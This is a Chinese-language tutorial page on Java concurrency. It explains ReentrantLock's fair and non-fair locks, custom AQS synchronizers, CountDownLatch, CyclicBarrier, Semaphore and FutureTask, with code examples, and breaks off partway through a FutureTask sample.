<p>ReentrantLock 内部有一个抽象类 <code>Sync</code>，继承了 <code>AQS</code>。而公平锁的实现就是 <code>FairSync</code>，非公平锁的实现就是 <code>NonFairSync</code>。</p>
<p>两把锁的区别在于 <code>lock</code> 方法的实现</p>
<h3 id="公平锁-lock方法实现"><a href="#公平锁-lock方法实现" class="headerlink" title="公平锁 lock方法实现"></a>公平锁 lock方法实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    sync.acquire(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用的是 AQS 的 <code>acquire</code>方法，而 AQS 会回调子类的 <code>tryAcquire</code>方法。</p>
<p>公平锁的情况是通过在构造方法中指定使用公平锁，此时内部类的 <code>sync</code> 为子类 <code>FairSync</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReentrantLock</span><span class="params">(<span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">    sync = fair ? <span class="keyword">new</span> FairSync() : <span class="keyword">new</span> NonfairSync();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>FairSync</code> 中 <code>tryAcquire</code> 的方法实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">    <span class="comment">//获取state变量，如果是0，说明锁可以获取</span></span><br><span class="line">    <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//判断AQS队列中是否有等待的线程，如果没有，就是用CAS尝试获取。获取成功后，将CLH的持有线程改成当前线程</span></span><br><span class="line">        <span class="keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;</span><br><span class="line">            compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重入锁逻辑</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">        <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>)  <span class="comment">//overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">        setState(nextc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面判断AQS队列中是否有等待的线程便是公平的体现。</p>
<h3 id="非公平锁的实现"><a href="#非公平锁的实现" class="headerlink" title="非公平锁的实现"></a>非公平锁的实现</h3><p>ReentrantLock 默认采用的是非公平锁，除非在构造方法中传入参数 true</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nonfairTryAcquire(acquires);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">nonfairTryAcquire</span><span class="params">(<span class="keyword">int</span> acquires)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Thread current = Thread.currentThread();</span><br><span class="line">    <span class="keyword">int</span> c = getState();</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//直接就是用CAS进行操作获取锁</span></span><br><span class="line">        <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>, acquires)) &#123;</span><br><span class="line">            setExclusiveOwnerThread(current);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (current == getExclusiveOwnerThread()) &#123;</span><br><span class="line">        <span class="keyword">int</span> nextc = c + acquires;</span><br><span class="line">        <span class="keyword">if</span> (nextc &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Error(<span class="string">&quot;Maximum lock count exceeded&quot;</span>);</span><br><span class="line">        setState(nextc);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ReentrantLock 中的公平锁和非公平锁的区别就在于：</p>
<p>调用 <code>lock</code> 方法获取锁的时候要不要判断 AQS 队列中是否有等待的线程，公平锁为了让每一个线程都均衡的使用锁，就需要判断，如果有，让给他，非公平锁很霸道，不让不让就不让。</p>
<p>但如果失败了，进入队列了，进会按照 AQS 的逻辑来，整体顺序就是公平的。</p>
<p>还有个注意的地方就是：ReentrantLock 的 <code>tryLock</code>（无超时机制） 方法使用的非公平策略。<br>而 <code>tryLock(long timeout, TimeUnit unit)</code> 方法则会根据 <code>Sync</code> 的具体实现来调用。不会直接的调用 <code>nonfairTryAcquire</code> 方法。</p>
<h2 id="自定义同步器"><a href="#自定义同步器" class="headerlink" title="自定义同步器"></a>自定义同步器</h2><p>自定义同步器在实现时只需要实现共享资源<code>state</code>的获取与释放方式即可，至于具体线程等待队列的维护(如获取资源失败入队/唤醒出队等)，AQS已经在顶层实现好了</p>
<p><strong>AQS的底层使用了模版方法模式</strong>，同步器的设计是基于模板方法模式的，如果需要自定义同步器一般的方式是这样（模板方法模式很经典的一个应用）：</p>
<ol>
<li>使用者继承<code>AbstractQueuedSynchronizer</code>并重写指定的方法。（这些重写方法很简单，无非是对于共享资源<code>state</code>的获取和释放）</li>
<li>将<code>AQS</code>组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。</li>
</ol>
<p><strong>AQS使用了模板方法模式，自定义同步器时需要重写下面几个AQS提供的模板方法：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isHeldExclusively()<span class="comment">//该线程是否正在独占资源。只有用到condition才需要去实现它。</span></span><br><span class="line">tryAcquire(<span class="keyword">int</span>)<span class="comment">//独占方式。尝试获取资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryRelease(<span class="keyword">int</span>)<span class="comment">//独占方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryAcquireShared(<span class="keyword">int</span>)<span class="comment">//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。</span></span><br><span class="line">tryReleaseShared(<span class="keyword">int</span>)<span class="comment">//共享方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br></pre></td></tr></table></figure>

<p>默认情况下，每个方法都抛出<code>UnsupportedOperationException</code>。 这些方法的实现必须是内部线程安全的，并且通常应该简短而不是阻塞。</p>
<p>AQS类中的其他方法都是<code>final</code>，所以无法被其他类使用，只有这几个方法可以被其他类使用。</p>
<p>一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现<code>tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared</code>中的一种即可。</p>
<p>但AQS也支持自定义同步器同时实现独占和共享两种方式，如<code>ReentrantReadWriteLock</code>。</p>
<blockquote>
<p>在<code>ReentrantLock</code>中，<code>state</code>初始化为0，表示未锁定状态。A线程<code>lock()</code>时，会调用<code>tryAcquire()</code>独占该锁并将<code>state+1</code>。此后，其他线程再<code>tryAcquire()</code>时就会失败，直到A线程<code>unlock()</code>到<code>state=0</code>（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A线程自己是可以重复获取此锁的（<code>state</code>会累加），这就是可重入的概念。但要注意，获取多少次就要释放多么次，这样才能保证<code>state</code>是能回到零态的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAqs</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        MyLock myLock=<span class="keyword">new</span> MyLock();</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            myLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;lock1&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                myLock.unlock();</span><br><span class="line">                System.out.println(<span class="string">&quot;unlock1&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;T1&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            myLock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(<span class="string">&quot;lock2&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">                myLock.unlock();</span><br><span class="line">                System.out.println(<span class="string">&quot;unlock2&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;T2&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义不可重入锁</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyLock</span> <span class="keyword">implements</span> <span class="title">Lock</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//继承同步器类</span></span><br><span class="line">    <span class="comment">//独占锁</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MySync</span> <span class="keyword">extends</span> <span class="title">AbstractQueuedSynchronizer</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryAcquire</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (compareAndSetState(<span class="number">0</span>,<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="comment">//成功，加上了锁，并且设置 owner 为当前线程</span></span><br><span class="line">                setExclusiveOwnerThread(Thread.currentThread());</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">tryRelease</span><span class="params">(<span class="keyword">int</span> arg)</span> </span>&#123;</span><br><span class="line">            setExclusiveOwnerThread(<span class="keyword">null</span>);</span><br><span class="line">            setState(<span class="number">0</span>); <span class="comment">//state被volatile,写屏障</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span>  <span class="comment">//是否持有独占锁</span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isHeldExclusively</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> getState()==<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> ConditionObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MySync sync=<span class="keyword">new</span> MySync();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用同步器</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//加锁,不成功会进入等待队列等待</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.acquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//加锁可打断</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        sync.acquireInterruptibly(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>   <span class="comment">//尝试加锁</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.tryAcquire(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//带超时时间的加锁	</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">tryLock</span><span class="params">(<span class="keyword">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.tryAcquireNanos(<span class="number">1</span>,unit.toNanos(time));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        sync.release(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//创建条件变量</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Condition <span class="title">newCondition</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sync.newCondition();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h2><p>用于进行线程同步协作，控制一个或者多个线程等待多个线程，等待所有线程完成倒计时</p>
<blockquote>
<p>继承了AQS同步器，其中构造方法用来初始化等待计数值，<code>await()</code>等待计数归零，<code>countDown()</code>用来让计数倒数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//任务执行子线程数要与count一致</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CountDownLatch</span><span class="params">(<span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">0</span>) <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;count &lt; 0&quot;</span>);</span><br><span class="line">    <span class="keyword">this</span>.sync = <span class="keyword">new</span> Sync(count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sync(<span class="keyword">int</span> count) &#123;</span><br><span class="line">    setState(count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><code>CountDownLatch</code>中，任务分为N个子线程去执行，<code>state</code>也初始化为N（注意N要与线程个数一致）。这N个子线程是并行执行的，每个子线程执行完后<code>countDown()</code>一次，<code>state</code>会<code>CAS</code>(Compare and Swap)减1。等到所有子线程都执行完后(即<code>state=0</code>)，会<code>unpark()</code>主调用线程，然后主调用线程就会从<code>await()</code>函数返回，继续后余动作。</p>
<p>内部维护一个计数器<code>cnt</code>，每次调用<code>countDown()</code>方法都会让计数器的值减一，减到0的时候，它表示所有的线程完成了任务，然后在闭锁上等待的线程就可以恢复执行任务，那么之前调用<code>await()</code>方法而在等待的线程就会被唤醒</p>
<p><img src="https://github.com/CyC2018/CS-Notes/raw/master/notes/pics/ba078291-791e-4378-b6d1-ece76c2f0b14.png" alt="CountDownLatch"></p>
<h3 id="不足"><a href="#不足" class="headerlink" title="不足"></a>不足</h3><p><code>CountDownLatch</code>是一次性的，计数器的值只能在构造方法中初始化一次，之后没有任何机制再次对其设置值，当<code>CountDownLatch</code>使用完毕后，它不能再次使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CountDownLatch latch=<span class="keyword">new</span> CountDownLatch(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t1.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t1.end&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t2.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t2.end&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;t3.begin..&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    latch.countDown();</span><br><span class="line">    System.out.println(<span class="string">&quot;t3.end..&quot;</span>);</span><br><span class="line">&#125;).start();</span><br><span class="line">System.out.println(<span class="string">&quot;waiting..&quot;</span>);</span><br><span class="line">latch.await();</span><br><span class="line">System.out.println(<span class="string">&quot;..end&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="配合线程池使用"><a href="#配合线程池使用" class="headerlink" title="配合线程池使用"></a>配合线程池使用</h3><blockquote>
<p>等待多个远程调用结束</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line">CountDownLatch latch=<span class="keyword">new</span> CountDownLatch(<span class="number">10</span>);</span><br><span class="line">Random r=<span class="keyword">new</span> Random();</span><br><span class="line">String[] all =<span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;<span class="number">10</span> ; j++) &#123;</span><br><span class="line">    <span class="keyword">int</span> k=j;</span><br><span class="line">    pool.execute(()-&gt;&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(r.nextInt(<span class="number">100</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            all[k]=i+<span class="string">&quot;%&quot;</span>;</span><br><span class="line">            <span class="comment">//在同一行变化。</span></span><br><span class="line">            System.out.print(<span class="string">&quot;\r&quot;</span>+ Arrays.toString(all));</span><br><span class="line">        &#125;</span><br><span class="line">        latch.countDown();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">latch.await();</span><br><span class="line">System.out.println(<span class="string">&quot;游戏开始&quot;</span>);</span><br><span class="line">pool.shutdown();</span><br></pre></td></tr></table></figure>

<h2 id="CycliBarrer"><a href="#CycliBarrer" class="headerlink" title="CycliBarrer"></a>CycliBarrer</h2><p>循环屏障，同样是用来进行线程协作；用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。</p>
<blockquote>
<p>内部调用了<code>ReentrantLock</code>，并无自定义Sync</p>
</blockquote>
<p>和<code>CountdownLatch</code>相似，都是通过维护计数器来实现的。线程执行<code>await()</code>方法之后计数器会减1，并进行等待，直到计数器为0，所有调用<code>await()</code>方法而在等待的线程才能继续执行。</p>
<p><code>CyclicBarrier</code>有两个构造函数，其中<code>parties</code>指示计数器的初始值，<code>barrierAction</code>在所有线程都到达屏障的时候会执行一次。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService pool = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">CyclicBarrier barrier=<span class="keyword">new</span> CyclicBarrier(<span class="number">2</span>,()-&gt;&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;task1,task2,finish..&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//若线程数为3</span></span><br><span class="line"><span class="comment">//task1,taks2,task1</span></span><br><span class="line"><span class="comment">//由于task1(1s) task2(2s),会导致是俩次task1减去计数。</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    pool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;t1.begin..&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="comment">//计数-1</span></span><br><span class="line">            barrier.await();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;t1.end&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    pool.submit(()-&gt;&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;t2.begin..&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            barrier.await();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | BrokenBarrierException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;t2.end&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">pool.shutdown();</span><br></pre></td></tr></table></figure>

<h3 id="CyclicBarrier和CountDownLatch的区别"><a href="#CyclicBarrier和CountDownLatch的区别" class="headerlink" title="CyclicBarrier和CountDownLatch的区别"></a>CyclicBarrier和CountDownLatch的区别</h3><ul>
<li><code>CountDownLatch</code>计数器，创建对象使用构造器定义初始值只能使用一次，而<code>CyclicBarrier</code>计数器提供了<code>reset()</code>方法，可以多次使用。</li>
<li><code>CountDownLatch</code>的设计思想强调的是一个（多个）线程等待其他线程执行完成后才能执行，而<code>CyclicBarrier</code>则是强调要多个线程都到达某一个条件，才能一起执行后续步骤。</li>
</ul>
<h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>信号量，用来限制能同时访问共享资源的线程上限</p>
<blockquote>
<p>继承了AQS同步器，有公平模式和非公平模式</p>
<ul>
<li>公平：调用<code>acquire()</code>的顺序就是获取许可证的顺序，遵循FIFO</li>
<li>非公平：抢占式</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//permit许可的数量</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Semaphore</span><span class="params">(<span class="keyword">int</span> permits)</span> </span>&#123;</span><br><span class="line">    sync = <span class="keyword">new</span> NonfairSync(permits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Semaphore</span><span class="params">(<span class="keyword">int</span> permits, <span class="keyword">boolean</span> fair)</span> </span>&#123;</span><br><span class="line">    sync = fair ? <span class="keyword">new</span> FairSync(permits) : <span class="keyword">new</span> NonfairSync(permits);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Sync(<span class="keyword">int</span> permits) &#123;</span><br><span class="line">    setState(permits);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>acquire()</code>用来获取许可，一次消耗一个信号量</li>
<li><code>realease()</code>用来释放许可</li>
</ul>
<blockquote>
<p>除了<code>acquire</code>方法之外，另一个比较常用的与之对应的方法是<code>tryAcquire</code>方法，该方法如果获取不到许可就立即返回<code>false</code>。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建Semaphore对象(限制线程数,fair?)</span></span><br><span class="line">Semaphore semaphore = <span class="keyword">new</span> Semaphore(<span class="number">3</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//添加许可，默认一次只用掉一个信号量，也可以参数传多个  </span></span><br><span class="line">            semaphore.acquire();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Thread.currentThread().getName()+<span class="string">&quot;running...&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName()+<span class="string">&quot;end&quot;</span>);</span><br><span class="line">            <span class="comment">//释放许可</span></span><br><span class="line">            semaphore.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,<span class="string">&quot;&quot;</span>+i).start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="FutureTask"><a href="#FutureTask" class="headerlink" title="FutureTask"></a>FutureTask</h2><p><code>Callable</code>接口它可以有返回值，返回值通过<code>Future</code>进行封装。<code>FutureTask</code>实现了<code>RunnableFuture</code>接口，该接口继承自<code>Runnable</code>和<code>Future</code>接口，这使得<code>FutureTask</code>既可以当做一个任务执行，也可以有返回值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FutureTask</span>&lt;<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">RunnableFuture</span>&lt;<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">interface</span> <span class="title">RunnableFuture</span>&lt;<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">Runnable</span>, <span class="title">Future</span>&lt;<span class="title">V</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>FutureTask</code>适用于异步获取执行结果或取消执行任务的场景。当一个任务需要执行很久时，就可以使用<code>FutureTask</code>进行封装，主线程在完成自己的任务后再回来获取结果。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException </span>&#123;</span><br><span class="line">    FutureTask&lt;Integer&gt; futureTask = <span class="keyword">new</span> FutureTask&lt;Integer&gt;(<span class="keyword">new</span> Callable&lt;Integer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Integer <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) 